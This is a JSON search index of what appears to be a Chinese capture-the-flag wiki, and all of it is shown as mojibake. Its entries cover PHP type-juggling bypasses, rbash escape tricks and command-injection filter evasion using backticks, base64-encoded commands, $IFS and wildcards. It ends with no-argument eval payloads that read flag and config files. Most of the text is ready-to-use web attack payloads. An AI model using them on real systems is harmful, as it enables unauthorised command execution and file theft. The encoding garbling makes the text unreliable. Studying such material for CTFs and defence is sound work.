æ³•å¤„ç†æ•°ç»„ç±»å‹æ•°æ®ï¼Œå¯¹äºæ•°ç»„ç±»å‹æ•°æ®è¿”å›NULLï¼Œå½“æˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„æ—¶ï¼Œå°±ä¼šå˜æˆä¸¤ä¸ªNULLï¼Œä¹Ÿå°±æ˜¯NULLNULLï¼ŒæˆåŠŸç»•è¿‡ å½“ä¸ºâ€œâ€ï¼šåœ¨ç±»å‹ç›¸åŒæ—¶æ‰ç›¸ç­‰ã€‚â€â€œå³non-strictæ¯”è¾ƒç¬¦ï¼Œä¼šåœ¨ç±»å‹è½¬æ¢åè¿›è¡Œæ¯”è¾ƒã€‚ æ­¤å¤–0 å­—ç¬¦ä¼šè¢«è®¤ä¸ºæ˜¯æ­£ç¡®çš„ï¼Œå¯ä»¥ç»•è¿‡éªŒè¯ã€‚"},{"title":"Linuxææƒ","path":"/wiki/WP/Linuxææƒ/index.html","content":"rbash ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"PHPç‰¹æ€§","path":"/wiki/WP/PHPç‰¹æ€§/index.html","content":"MD5ç»•è¿‡ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç‰¹æ€§ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"rbash","path":"/wiki/WP/Linuxææƒ/rbash.html","content":"ä»€ä¹ˆæ˜¯rbashrbash,å³å—é™åˆ¶çš„ bash,å…¶å¯ä»¥ç”¨ä½œä¸­è½¬æœåŠ¡å™¨ï¼ˆå®é™…ä¸Šrbashåªæ˜¯bashçš„ä¸€ä¸ªè½¯é“¾æ¥ï¼‰ã€‚å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œã€‚ å¦‚ä½•è®¾ç½®rbash1ï¼Œå¤åˆ¶ä¸€ä¸ªbashï¼Œé‡å‘½åä¸ºrbash cp /bin/bash /bin/rbash2ï¼Œè®¾ç½®ç”¨æˆ·tomç™»é™†çš„shellä¸ºrbash useradd -s /bin/rbash tom3, åœ¨tomç”¨æˆ·ä¸‹æ–°å»ºä¸€ä¸ª.binç›®å½•å­˜æ”¾å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ mkdir -p /home/tom/.bin4, é€šè¿‡è½¯è¿æ¥æ‰§è¡Œå‘½ä»¤ ln -s /bin/clear /home/$tom/.bin/clear5, ç¼–è¾‘æ–‡ä»¶/home/$tom/.bashrc,æ·»åŠ export PATH=$HOME/.bin/.æ–‡ä»¶ä¸€å®šè¦ä»¥# .bashrcä¸ºé¦–è¡Œ. å¦‚ä½•ç»•è¿‡é™åˆ¶ä¿¡æ¯æ”¶é›†tom@DC-2:~$ echo $PATH/home/tom/usr/bintom@DC-2:~$ echo /home/tom/usr/bin/*/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/viemv æŸ¥çœ‹ç¯å¢ƒå˜é‡ ç‰¹åˆ«æ˜¯æŸ¥çœ‹shell å’ŒPATHæ£€æŸ¥ç¼–ç¨‹è¯­è¨€ java php ...sudo -l å¸¸è§çš„é€ƒé€¸æŠ€æœ¯ â€œ â€ å¦‚æœå…è®¸ï¼Œç›´æ¥è¿è¡Œbinbash cp cp /bin/bash test1cp /bin/sh test2./test1 # åˆ‡æ¢åˆ°äº†/bin/bash./test2 # åˆ‡æ¢åˆ°äº†/bin/sh å¸¸è§çš„åº”ç”¨ 1 ftp,gdb,man ftp !/bin/sh gdb !/bin/sh man !/bin/sh2 git git git help status3 vi/vim :set shell=/bin/bsah :shell æˆ–è€… :!/bin/bash4 BASH_CMDS[a]=/bin/sh;a #æŠŠ/bin/bashç»™aå˜é‡export PATH=$PATH:/bin/ #å°†/bin ä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡ºexport PATH=$PATH:/usr/bin #å°†/usr/binä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡º"},{"title":"ç‰¹æ€§","path":"/wiki/WP/PHPç‰¹æ€§/ç‰¹æ€§.html","content":"1.intval()intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1 intval($num, 0) çš„ä½œç”¨:intval() æ˜¯ PHP å‡½æ•°ï¼Œç”¨äºå°†å˜é‡ $num è½¬æ¢ä¸ºæ•´æ•°ã€‚å‚æ•° 0 è¡¨ç¤ºè¿›åˆ¶è‡ªåŠ¨æ£€æµ‹ï¼šå¦‚æœ $num ä»¥ 0x æˆ– 0X å¼€å¤´ï¼ˆå¦‚ 0x117cï¼‰ï¼ŒæŒ‰åå…­è¿›åˆ¶è½¬æ¢ã€‚å¦‚æœ $num ä»¥ 0 å¼€å¤´ï¼ˆå¦‚ 010574ï¼‰ï¼ŒæŒ‰å…«è¿›åˆ¶è½¬æ¢ã€‚å…¶ä»–æƒ…å†µï¼ˆå¦‚ 4476ï¼‰ï¼ŒæŒ‰åè¿›åˆ¶è½¬æ¢ã€‚ 2. æ­£åˆ™show_source(__FILE__);include(flag.php);$a=$_GET[cmd];if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; /iè¡¨ç¤ºåŒ¹é…å¤§å°å†™å­—ç¬¦ ^ å’Œ $ åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œéœ€è¦åŒ¹é…ä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾/m å¤šè¡ŒåŒ¹é… è‹¥å­˜åœ¨æ¢è¡Œ å¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…ä½†æ˜¯å½“å‡ºç°æ¢è¡Œç¬¦ %0açš„æ—¶å€™ï¼Œ$cmdçš„å€¼ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶ç¬¬äºŒä¸ªifæ­£åˆ™åŒ¹é…ä¸ç¬¦åˆä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾ 3.in_array()in_array(search,array,type)å¦‚æœç»™å®šçš„å€¼ search å­˜åœ¨äºæ•°ç»„ array ä¸­åˆ™è¿”å› trueã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º trueï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueã€‚å¦‚æœæ²¡æœ‰åœ¨æ•°ç»„ä¸­æ‰¾åˆ°å‚æ•°ï¼Œå‡½æ•°è¿”å› falseã€‚æ³¨é‡Šï¼šå¦‚æœ search å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œä¸” type å‚æ•°è®¾ç½®ä¸º trueï¼Œåˆ™æœç´¢åŒºåˆ†â¼¤â¼©å†™ã€‚ æ²¡æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ—¶å€™è¿›â¾çš„å°±æ˜¯å¼±â½è¾ƒï¼Œå°±ä¼šå­˜åœ¨å¼ºåˆ¶çš„ç±»å‹è½¬æ¢ï¼Œå¦‚123.phpå°±ä¼šè½¬æ¢æˆ123 4.ä¼˜å…ˆçº§ and5. åå°„ç±»åå°„ç±»ReflectionClassæ‰§â¾å‘½ä»¤ReflectionClassåå°„ç±»åœ¨PHP5æ–°åŠ â¼Šï¼Œç»§æ‰¿â¾ƒReflectorï¼Œå®ƒå¯ä»¥ä¸å·²å®šä¹‰çš„ç±»å»ºâ½´æ˜ å°„å…³ç³»ï¼Œé€šè¿‡åå°„ç±»å¯ä»¥å¯¹ç±»æ“ä½œåå°„ç±»ä¸ä»…ä»…å¯ä»¥å»ºâ½´å¯¹ç±»çš„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥å»ºâ½´å¯¹PHPåŸºæœ¬â½…æ³•çš„æ˜ å°„ï¼Œå¹¶ä¸”è¿”å›åŸºæœ¬â½…æ³•æ‰§â¾çš„æƒ…å†µã€‚å› æ­¤å¯ä»¥é€šè¿‡å»ºâ½´åå°„ç±»new ReflectionClass(system(cmd))æ¥æ‰§â¾å‘½ä»¤ 6.is_numeric()is_numeric() â½¤äºæ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›true ï¼Œå¦åˆ™è¿”å›falseã€‚å¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰â¼€ä¸ªeä»£è¡¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯è¿”å›trueã€‚ 7.call_user_func()call_user_func() å‡½æ•°â½¤äºè°ƒâ½¤â½…æ³•æˆ–è€…å˜é‡ï¼Œç¬¬â¼€ä¸ªå‚æ•°æ˜¯è¢«è°ƒâ½¤çš„å‡½æ•°ï¼Œç¬¬â¼†ä¸ªæ˜¯è°ƒâ½¤çš„å‡½æ•° çš„å‚æ•° 8."},{"title":"REC","path":"/wiki/WP/REC/index.html","content":"linuxæ ‡å‡†è¾“å…¥è¾“å‡º ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ RECè¿‡æ»¤ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ æ— å‚æ•°REC ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ æ— å­—æ¯ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ è·å–ç›®å½• ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ è¯»å–æ–‡ä»¶ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"linuxæ ‡å‡†è¾“å…¥è¾“å‡º","path":"/wiki/WP/REC/linuxæ ‡å‡†è¾“å…¥è¾“å‡º.html","content":"web42if(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); çŸ¥è¯†ç‚¹ devnull 210 æ ‡å‡†è¾“â¼Š1 æ ‡å‡†è¾“å‡º2 é”™è¯¯è¾“å‡ºåœ¨ç±»Unixç³»ç»Ÿä¸­,/dev/null,æˆ–ç§°ç©ºè®¾å¤‡,æ˜¯â¼€ä¸ªç‰¹æ®Šçš„è®¾å¤‡â½‚ä»¶,å®ƒä¸¢å¼ƒâ¼€åˆ‡å†™â¼Šå…¶ä¸­çš„æ•°æ®(ä½†æŠ¥å‘Šå†™â¼Šæ“ä½œæˆåŠŸ)åŒºåˆ«ï¼š2/dev/null æŠŠé”™è¯¯è¾“å‡ºåˆ°ç©ºè®¾å¤‡ï¼ˆå³ä¸¢å¼ƒï¼‰/dev/null 21 ç›¸å½“äº1/dev/null 21 å³æŠŠæ ‡å‡†è¾“å‡ºä¸¢å¼ƒï¼Œå¹¶ä¸”æŠŠé”™è¯¯è¾“å‡ºè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚åˆè®¡èµ·æ¥å°±æ˜¯é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½è¾“å‡ºåˆ°ç©ºè®¾å¤‡21 /dev/null é”™è¯¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œå³è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œâ½½æ ‡å‡†è¾“å‡ºè¢«ä¸¢å¼ƒé‡å®šå‘ å’Œ å‰è€…ä¼šå…ˆæ¸…ç©ºâ½‚ä»¶ï¼Œç„¶åå†å†™â¼Šå†…å®¹ï¼Œåè€…ä¼šå°†é‡å®šå‘çš„å†…å®¹è¿½åŠ åˆ°ç°æœ‰â½‚ä»¶çš„å°¾éƒ¨. è§£é¢˜å…³é”®ç‚¹ åˆ†å‰²ï¼š| || ?c=tac flag |ls;"},{"title":"RECè¿‡æ»¤","path":"/wiki/WP/REC/RECè¿‡æ»¤.html","content":"RECping -c 1 wwww.baidu.com ping -c 1 wwww.baidu.com åœ¨å‘½ä»¤æ‰§è¡Œæœ‰ä¸‹é¢å‡ ç§å¯èƒ½ï¼š å‘½ä»¤å¯æ§ æ¯”å¦‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶pingè¿™ä¸ªå­—ç¬¦ä¸² å‚æ•°å¯æ§ -c å¯æ§ å‚æ•°å€¼å¯æ§ 1å’Œwww.baidu.com å¯æ§ æ•´ä½“å¯æ§ï¼Œä½†æ˜¯è¦çªç ´è¿‡æ»¤ æˆ‘ä»¬é‡åˆ°å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦é¦–å…ˆåˆ¤æ–­å¯æ§çš„ä½ç½®ï¼Œç„¶åé’ˆå¯¹æ€§çš„ç»•è¿‡ å¯ä»¥ç”¨ç³»ç»Ÿå‡½æ•°:system exec highlight system(â€˜lsâ€™); exec() **exec()**é»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho.è€Œä¸”åªä¼šå›æ˜¾å‡ºä¸€è¡Œç»“æœ,å› æ­¤å¸¸ç”¨ç¬¬äºŒä¸ªæ•°ç»„å‚æ•°æ¥æ”¶å¤šè¡Œç»“æœ. payload:$arr=[]; echo exec(ipconfig,$arr); var_dump($arr); **shell_exec()**é»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho,å¯ä»¥è¾“å‡ºå¤šè¡Œç»“æœ. payload:echo shell_exec(ipconfig); highlight å…¶ä»–å‡½æ•° passthru echo phpä¼ªåè®® show_source passthru(â€˜lsâ€™); åŒ system echo tac config.php; PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ``ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ - ä¼ªåè®®:include(php://filter/read=convert.base64-encode/resource=config.php); - show_source(config.php); //å’Œhighlight_file() ä¸€æ ·ï¼Œå°†æŒ‡å®š PHP æ–‡ä»¶çš„æºä»£ç ä»¥é«˜äº®å½¢å¼è¾“å‡ºåˆ°æµè§ˆå™¨æˆ–è¿”å›ä¸ºå­—ç¬¦ä¸² ç”¨getæ–¹å¼ ?c=echo \\`$_GET[1]`\\;1=tac config.php æ„é€ system ?c=$a=sys;$b=tem;$d=$a.$b;$d(cat config.php); cat è¢«è¿‡æ»¤ï¼šé™¤äº†cat è¿˜æœ‰ tacã€moreã€ lessã€headã€tailã€nlã€sedã€sortã€uniqã€rev æ–‡ä»¶æœ¬èº«è¢«è¿‡æ»¤ï¼Œå¯ä»¥æ¨¡ç³ŠåŒ¹é… con* ï¼Œä¹Ÿå¯ä»¥base64åŠ å¯†è§£å¯† ?c=$a=base64_decode(Y2F0IGNvbmZpZy5waHA=);passthru($a); Y2F0IGNvbmZpZy5waHA=æ˜¯cat config.phpçš„base64åŠ å¯† å¦‚æœï¼›è¢«ç¦ï¼Œå¯ä»¥å°è¯•é—­åˆæ•´ä¸ªphpä»£ç  ? å‚æ•°æ˜¯C å¯ä»¥ç”¨$_GET[a] æ¥ç»•è¿‡ 1.æ¶‰åŠåˆ°ä¸€ä¸ªphpçš„ä»£ç ç»“æ„ï¼Œ.....â‘¡payloadä¸ºï¼š?c=include $_GET[a]?ï¼Œç­‰åŒäºï¼Œphpçš„æœ€åä¸€è¡Œä»£ç å¯ä»¥çœå»åˆ†å·.....â‘¢includeå‡½æ•°åŒ…å«æ–‡ä»¶ï¼Œä¸”é¢˜ç›®æ˜¯å¯¹å‚æ•°cæ­£åˆ™è¿‡æ»¤ï¼Œå› æ­¤GETå‹ä¼ å‚aå¯ä»¥ç»•è¿‡ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä¼ªåè®®æ–‡ä»¶å‘½ä»¤ï¼Œè¯»å–config.phpæ–‡ä»¶ï¼šphp://filter/convert.base64-encode/resource=./config.phpâ‘£å› æ­¤è¿èµ·æ¥æ„é€ çš„payloadä¸ºï¼š ?c=include $_GET[a]?a=php://filter/convert.base64-encode/resource=config.php2./?c=echo `$_GET[a]`?a=cat config.php è®©å…¶echoä¸€ä¸ªgetè¯·æ±‚ï¼Œ?é—­åˆï¼Œè¯·æ±‚å†…å®¹ä¸ºcat config.php ä¹Ÿå¯ä»¥ç”¨postæ¥ç»•è¿‡ï¼šå…ˆ?cecho $_POST[a\\];ç„¶åå†ç”¨hackbarä¼ å‚æ•° a cat config.php åªç¦ç”¨äº†*å’Œ?å¸¸ç”¨é€šé…ç¬¦ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–é€šé…ç¬¦[c1-c2],[!c1-c2],[list]ç­‰ payloadï¼š?cecho tac confi[g][!0-9]ph[p]; nginx æ—¥å¿—æ–‡ä»¶è·¯å¾„ varlognginxaccess.log å¯ä»¥ç”¨ cvarlognginxaccess.log1system(â€œtac%2036d.phpâ€); æ¥ç»•è¿‡c çš„æ£€æµ‹ print_r(glob(â€œ*â€)) : glob()å‡½æ•°è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨globå‡½æ•°æ¥æŸ¥æ‰¾æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å®ç°ç›®å½•çš„éå† scandir()ä¹Ÿå¯ä»¥ï¼Œå…·ä½“ç”¨æ³• :print_r(scandir(â€˜.â€˜)) æ–‡ä»¶åŒ…å«çš„ç”¨å¤„åœ¨phpä¸­åˆ©ç”¨è¯¥å‡½æ•°å¯ä»¥å°†å…¶ä»–æ–‡ä»¶å¼•å…¥å½“å‰phpæ–‡ä»¶ï¼Œè¢«å¼•å…¥çš„æ–‡ä»¶é‡Œæœ‰phpè¯­å¥å°±èƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ å¯ä»¥å…ˆå¼•å…¥æ–‡ä»¶ï¼Œå†ç”¨ä¸­å›½èšå‰‘è¿æ¥ ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒ12 è¿‡æ»¤ç©ºæ ¼cat$IFSflag.txtcat$IFS$9flag.txt $IFS$1 ä¹Ÿå¯ä»¥catflag.txt catflag.txt %0aä»£æ›¿æ¢è¡Œï¼Œ%09ä»£æ›¿TABé”® è¿‡æ»¤ ï¼šå¯ä»¥å…ˆç›®å½•å†æŸ¥çœ‹ cd xxxx;cat xxx"},{"title":"æ— å‚æ•°REC","path":"/wiki/WP/REC/æ— å‚æ•°REC.html","content":"ä»£ç if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); å¸¸è§ç»•è¿‡å§¿åŠ¿getallheaders()ï¼šè¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯æ•°ç»„â½½evalè¦æ±‚ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦â½¤implode()å‡½æ•°å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²get_defined_vars()ï¼šè¯¥å‡½æ•°çš„ä½œâ½¤æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¸è¿‡æ˜¯â¼†ç»´æ•°ç»„ï¼Œâ½¤var_dump()è¾“å‡ºå¯ä»¥çœ‹â»…è¾“å‡ºçš„å†…å®¹ï¼Œçœ‹â»…åœ¨ç¬¬â¼ä½ä¹‹åï¼Œå¯ä»¥â½¤current()å‡½æ•°æ¥è·å–å…¶å€¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹å®˜â½…å‡½æ•°ã€‚payloadï¼švar_dump(current(get_defined_vars()));session_id()ï¼šsession_id()å¯ä»¥â½¤æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œå¯ä»¥â½¤è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚ å¦‚å¯ä»¥åœ¨cookieä¸­è®¾ç½® PHPSESSID=706870696e666f28293bï¼Œç„¶åâ½¤hex2bin()å‡½æ•°ï¼Œå³ä¼ â¼Š?exp=eval(hex2bin(session_id(session_start()))); å¹¶è®¾ç½®cookieï¼šPHPSESSID=706870696e666f28293b session_start å‡½æ•°æ˜¯ä¸ºäº†å¼€å¯sessioné…åˆä½¿â½¤çš„å‡½æ•°ï¼šprint_r(scandir(â€˜.â€™)); æŸ¥çœ‹å½“å‰â½¬å½•ä¸‹çš„æ‰€æœ‰â½‚ä»¶å var_dump()localeconv() å‡½æ•°è¿”å›â¼€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬â¼€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«åeach() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€æ­¥end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åâ¼€ä¸ªå•å…ƒnext() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€ä½prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›â¼€ä½array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ payload1?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); è§£é‡Š?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));ï¼šè¿™æ˜¯ä¸€ä¸ªGETè¯·æ±‚çš„å‚æ•°cï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªPHPè¡¨è¾¾å¼ã€‚echoï¼šPHPä¸­çš„è¾“å‡ºå‡½æ•°ï¼Œç”¨äºè¾“å‡ºå­—ç¬¦ä¸²æˆ–è¡¨è¾¾å¼çš„ç»“æœã€‚highlight_fileï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºé«˜äº®æ˜¾ç¤ºPHPæ–‡ä»¶çš„å†…å®¹ã€‚nextï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºå°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚array_reverseï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºåè½¬æ•°ç»„å…ƒç´ çš„é¡ºåºã€‚scandirï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºåˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚posï¼šPHPä¸­çš„å‡½æ•°ï¼Œè¿”å›æ•°ç»„ä¸­å½“å‰å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å€¼ã€‚localeconv()ï¼šPHPä¸­çš„å‡½æ•°ï¼Œè¿”å›æœ¬åœ°åŒ–çš„æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯ã€‚ å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼šlocaleconv()ï¼šè·å–æœ¬åœ°åŒ–çš„æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯ã€‚pos(localeconv())ï¼šè·å–localeconv()è¿”å›æ•°ç»„ä¸­å½“å‰å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å€¼ã€‚scandir(pos(localeconv()))ï¼šåˆ—å‡ºpos(localeconv())æŒ‡å‘çš„ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚array_reverse(scandir(pos(localeconv())))ï¼šåè½¬è¿™äº›æ–‡ä»¶å’Œå­ç›®å½•çš„é¡ºåºã€‚next(array_reverse(scandir(pos(localeconv()))))ï¼šå°†å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå³ä¸‹ä¸€ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•ã€‚highlight_file(next(array_reverse(scandir(pos(localeconv())))))ï¼šé«˜äº®æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚echoï¼šè¾“å‡ºè¿™ä¸ªé«˜äº®æ˜¾ç¤ºçš„å†…å®¹ã€‚ payload2?c=eval(next(reset(get_defined_vars())));1=;system(tac%20flag.php); è§£é‡Š?c=eval(next(reset(get_defined_vars())));ï¼šè¿™æ˜¯GETè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå…¶ä¸­cå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªPHPè¡¨è¾¾å¼ã€‚get_defined_vars()ï¼šè¿™ä¸ªå‡½æ•°è¿”å›å½“å‰æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„æ•°ç»„ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ã€‚reset()ï¼šè¿™ä¸ªå‡½æ•°å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚next()ï¼šè¿™ä¸ªå‡½æ•°å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½ï¼Œå¹¶è¿”å›å½“å‰æŒ‡é’ˆå¤„çš„å…ƒç´ å€¼ã€‚eval()ï¼šè¿™ä¸ªå‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç ã€‚è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å°è¯•æ‰§è¡Œget_defined_vars()è¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ä½œä¸ºPHPä»£ç ã€‚1=;system(tac%20flag.php);ï¼šè¿™æ˜¯GETè¯·æ±‚çš„å¦ä¸€éƒ¨åˆ†ï¼Œå°è¯•é€šè¿‡URLå‚æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚system()ï¼šè¿™ä¸ªå‡½æ•°æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ï¼Œå¹¶å°†å®Œæ•´çš„è¾“å‡ºè¿”å›ã€‚tac%20flag.phpï¼šè¿™é‡Œçš„å‘½ä»¤æ˜¯tac flag.phpï¼Œtacæ˜¯åå‘è¾“å‡ºæ–‡ä»¶å†…å®¹çš„Unixå‘½ä»¤ï¼Œ%20æ˜¯URLç¼–ç çš„ç©ºæ ¼ã€‚è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å°è¯•æ‰§è¡Œflag.phpæ–‡ä»¶çš„åå‘å†…å®¹ã€‚ payload3é¢˜è§£ï¼ŒæŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•getcwd()ï¼Œæ‰«æå½“å‰ç›®å½•åŠæ–‡ä»¶scandir()è¾“å‡º ä¸ºæ•°ç»„ï¼Œflag.php 